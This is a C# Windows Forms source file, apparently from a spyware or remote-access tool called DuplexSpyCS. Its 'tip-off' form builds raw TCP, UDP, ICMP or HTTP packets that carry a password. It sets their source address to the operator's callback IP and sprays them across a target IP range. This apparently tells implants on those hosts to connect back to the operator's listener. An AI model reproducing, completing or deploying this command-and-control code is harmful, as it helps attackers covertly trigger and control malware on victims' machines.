using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using PacketDotNet;
using PacketDotNet.Utils;
using SharpPcap;
using SharpPcap.LibPcap;
using System.Net.Sockets;

namespace DuplexSpyCS
{
    public partial class frmTipoff : Form
    {
        private Listener m_listener;

        private enum RequestMode
        {
            Single,
            Multiple,
            LAN,
        }
        private enum RequestProtocol
        {
            TCP,
            UDP,
            ICMP,
            HTTP,
        }
        private enum HttpAction
        {
            GET,
            POST,
            HEAD,
            PUT,
        }

        public List<ILiveDevice> m_lsDevice;
        public List<NetworkInterface> m_lsNetworkInterface;

        public frmTipoff(Listener l)
        {
            m_listener = l;

            InitializeComponent();
        }

        private RequestMode fnGetRequestMode() => (RequestMode)Enum.Parse(typeof(RequestMode), comboBox2.Text);
        private RequestProtocol fnGetRequestProtocol() => (RequestProtocol)Enum.Parse(typeof(RequestProtocol), comboBox1.Text);

        private TcpPacket fnBuildTcpPacket
        (
            int nPortCallback,
            int nDestPort,
            int nWndSize,

            bool bSYN,
            bool bACK,
            bool bFIN,
            bool bPUSH,
            bool bRST,
            bool bURG,

            string szPassword
        )
        {
            TcpPacket pktTCP = new TcpPacket((ushort)nPortCallback, (ushort)nDestPort);
            pktTCP.WindowSize = (ushort)nWndSize;
            pktTCP.Synchronize = bSYN;
            pktTCP.Acknowledgment = bACK;
            pktTCP.Finished = bFIN;
            pktTCP.Push = bPUSH;
            pktTCP.Reset = bRST;
            pktTCP.Urgent = bURG;

            pktTCP.PayloadData = Encoding.UTF8.GetBytes(szPassword);

            return pktTCP;
        }
        private UdpPacket fnBuildUdpPacket
        (
            int nPortCallback,
            int nDestPort,

            string szPassword
        )
        {
            UdpPacket pktUDP = new UdpPacket((ushort)nPortCallback, (ushort)nDestPort);
            pktUDP.PayloadData = Encoding.UTF8.GetBytes(szPassword);

            return pktUDP;
        }
        private IcmpV4Packet fnBuildIcmpPacket
        (
            int nTypeCode,
            int nCode,
            int nPort
        )
        {

            IcmpV4Packet pktICMP = new IcmpV4Packet(new ByteArraySegment(new byte[4]));
            pktICMP.TypeCode = (IcmpV4TypeCode)((nTypeCode << 8) | nCode);
            pktICMP.Id = (ushort)nPort;

            return pktICMP;
        }
        private TcpPacket fnBuildHttpPacket
        (
            int nPortCallback,
            int nDestPort,

            HttpAction httpAction,
            string szDomain,
            string szPage,
            string szUA,

            string szPassword
        )
        {
            string szHttpPayload = $"" +
                $"{httpAction.ToString()} {szPage} HTTP/1.1\r\n" +
                $"Host: {szDomain}\r\n" +
                $"User-Agent: {szUA}\r\n" +
                $"Content-Type: application/x-www-form-urlencoded\r\n" +
                $"Content-Length: {szPassword.Length}\r\n" +
                $"\r\n" +
                $"{szPassword}";

            TcpPacket pkt = new TcpPacket((ushort)nPortCallback, (ushort)nDestPort);
            pkt.Synchronize = true;
            pkt.PayloadData = Encoding.UTF8.GetBytes(szHttpPayload);

            return pkt;
        }

        private void fnTipoffRequest()
        {
            string szPassword = textBox11.Text;
            int nPortCallback = (int)numericUpDown2.Value;

            bool bRandomDestPort = checkBox7.Checked;
            int nDestPort = bRandomDestPort ? new Random().Next(0, 65535) : (int)numericUpDown1.Value;

            IPAddress ipCallback = IPAddress.Parse(textBox1.Text);
            IPAddress ipStartTarget = IPAddress.Parse(textBox2.Text);
            IPAddress ipEndTarget = IPAddress.Parse(textBox3.Text);

            byte[] abIpStart = ipStartTarget.GetAddressBytes();
            byte[] abIpEnd = ipEndTarget.GetAddressBytes();

            Array.Reverse(abIpStart);
            Array.Reverse(abIpEnd);

            uint uiIpStart = BitConverter.ToUInt32(abIpStart, 0);
            uint uiIpEnd = BitConverter.ToUInt32(abIpEnd, 0);

            Packet pkt = null;
            switch (fnGetRequestProtocol())
            {
                case RequestProtocol.TCP:
                    //Window Size
                    int nWndSize = (int)numericUpDown3.Value;

                    //TCP flags
                    bool bSYN = checkBox1.Checked;
                    bool bACK = checkBox2.Checked;
                    bool bFIN = checkBox3.Checked;
                    bool bPUSH = checkBox5.Checked;
                    bool bRST = checkBox4.Checked;
                    bool bURG = checkBox6.Checked;

                    pkt = fnBuildTcpPacket(
                            nPortCallback,
                            nDestPort,
                            nWndSize,

                            bSYN,
                            bACK,
                            bFIN,
                            bPUSH,
                            bRST,
                            bURG,

                            szPassword
                        );
                    break;
                case RequestProtocol.UDP:
                    pkt = fnBuildUdpPacket(
                            nPortCallback,
                            nDestPort,

                            szPassword
                        );
                    break;
                case RequestProtocol.ICMP:
                    int nType = (int)numericUpDown4.Value;
                    int nCode = (int)numericUpDown5.Value;

                    pkt = fnBuildIcmpPacket(
                            nType,
                            nCode,
                            nDestPort
                        );
                    break;
                case RequestProtocol.HTTP:
                    HttpAction httpAction = (HttpAction)Enum.Parse(typeof(HttpAction), comboBox3.Text);
                    string szDomain = textBox5.Text;
                    string szPage = textBox6.Text;
                    string szUA = textBox7.Text;

                    pkt = fnBuildHttpPacket(
                            nPortCallback,
                            nDestPort,

                            httpAction,
                            szDomain,
                            szPage,
                            szUA,

                            szPassword
                        );
                    break;
                default:
                    if (pkt == null)
                    {
                        MessageBox.Show("Unknown RequestProtocol", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                    }

                    break;
            }

            new Thread(() =>
            {
                for (int i = 0; i < m_lsDevice.Count; i++)
                {
                    for (uint j = uiIpStart; j <= uiIpEnd; j++)
                    {
                        try
                        {
                            var device = m_lsDevice[i];
                            var x = GetDeviceIPv4Address(device);
                            string szIPv4Addr = x.szIPv4Addr;
                            if (string.IsNullOrEmpty(szIPv4Addr))
                                continue;

                            byte[] abTargetIP = BitConverter.GetBytes(j);
                            Array.Reverse(abTargetIP);
                            IPAddress ipTarget = new IPAddress(abTargetIP);

                            IPv4Packet pktIPv4 = new IPv4Packet(ipCallback, ipTarget);
                            pktIPv4.PayloadPacket = pkt;

                            EthernetPacket pktEth = new EthernetPacket(device.MacAddress, PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"), EthernetType.IPv4);
                            pktEth.PayloadPacket = pktIPv4;

                            device.Open();
                            device.SendPacket(pktEth);
                            device.Close();
                        }
                        catch (Exception ex)
                        {
                            //MessageBox.Show(ex.Message);
                        }
                    }
                }
            }).Start();
        }

        private (string szIPv4Addr, NetworkInterface netif, IPAddress mask, IPAddress gate) GetDeviceIPv4Address(ILiveDevice device)
        {
            string szIPv4Addr = null;
            NetworkInterface netIf = null;
            IPAddress maskAddr = null;
            IPAddress gatewayAddr = null;

            foreach (var netif in m_lsNetworkInterface)
            {
                if (netif.Description == device.Description)
                {
                    var ipProperties = netif.GetIPProperties();
                    UnicastIPAddressInformationCollection coll = ipProperties.UnicastAddresses;
                    foreach (var ip in coll)
                    {
                        if (ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                        {
                            szIPv4Addr = ip.Address.ToString();
                            netIf = netif;
                            maskAddr = ip.IPv4Mask;
                            break;
                        }
                    }

                    foreach (var ip in ipProperties.GatewayAddresses)
                    {
                        if (ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                        {
                            gatewayAddr = ip.Address;
                            break;
                        }
                    }
                }
            }

            return (szIPv4Addr, netIf, maskAddr, gatewayAddr);
        }

        void fnSetup()
        {
            //Controls
            if (m_listener == null)
            {
                MessageBox.Show("Not listening port found.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
            else
            {
                try
                {
                    textBox1.Text = "127.0.0.1";
                    numericUpDown2.Value = m_listener.port;
                }
                catch
                {

                }
            }

            //Mode
            foreach (string opt in Enum.GetNames(typeof(RequestMode)))
                comboBox2.Items.Add(opt);
            //Protocol
            foreach (string opt in Enum.GetNames(typeof(RequestProtocol)))
                comboBox1.Items.Add(opt);

            //HTTP Action
            foreach (string opt in Enum.GetNames(typeof(HttpAction)))
                comboBox3.Items.Add(opt);

            checkBox1.Checked = true;

            comboBox1.SelectedIndex = 0;
            comboBox2.SelectedIndex = 0;
            comboBox3.SelectedIndex = 0;

            comboBox1.DropDownStyle = ComboBoxStyle.DropDownList;
            comboBox2.DropDownStyle = ComboBoxStyle.DropDownList;
            comboBox3.DropDownStyle = ComboBoxStyle.DropDownList;

            textBox5.Text = "www.example.com"; //Domain
            textBox6.Text = "/"; //Page
            textBox7.Text = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36";

            //Load interface
            m_lsDevice = CaptureDeviceList.Instance.ToList();
            m_lsNetworkInterface = NetworkInterface.GetAllNetworkInterfaces().ToList();
        }

        private void frmTipoff_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            fnTipoffRequest();
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            RequestProtocol reqProto = (RequestProtocol)Enum.Parse(typeof(RequestProtocol), comboBox1.Text);
            switch (reqProto)
            {
                case RequestProtocol.TCP:
                    groupBox3.Enabled = true;
                    groupBox4.Enabled = false;
                    groupBox5.Enabled = false;
                    break;
                case RequestProtocol.UDP:
                    groupBox3.Enabled = false;
                    groupBox4.Enabled = false;
                    groupBox5.Enabled = false;
                    break;
                case RequestProtocol.ICMP:
                    groupBox3.Enabled = false;
                    groupBox4.Enabled = true;
                    groupBox5.Enabled = false;
                    break;
                case RequestProtocol.HTTP:
                    groupBox3.Enabled = false;
                    groupBox4.Enabled = false;
                    groupBox5.Enabled = true;
                    break;
            }
        }

        private void groupBox6_Enter(object sender, EventArgs e)
        {

        }

        private void comboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {
            RequestMode reqMode = (RequestMode)Enum.Parse(typeof(RequestMode), comboBox2.Text);
            switch (reqMode)
            {
                case RequestMode.Single:
                    textBox2.Enabled = true;
                    textBox3.Enabled = false;
                    textBox10.Enabled = false;
                    break;
                case RequestMode.Multiple:
                    textBox2.Enabled = true;
                    textBox3.Enabled = true;
                    textBox10.Enabled = false;
                    break;
                case RequestMode.LAN:
                    textBox2.Enabled = false;
                    textBox3.Enabled = false;
                    textBox10.Enabled = true;
                    break;
            }
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {
            textBox3.Text = textBox2.Text;
        }

        //Test
        private void button2_Click(object sender, EventArgs e)
        {
            Task.Run(() =>
            {
                try
                {
                    Socket skt = new Socket(AddressFamily.InterNetwork, SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp);
                    skt.Connect(new IPEndPoint(IPAddress.Parse(textBox1.Text), (int)numericUpDown2.Value));
                    skt.Close();

                    MessageBox.Show("Connect successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Failed to connect remote host.", "Failed", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            });
        }
    }
}
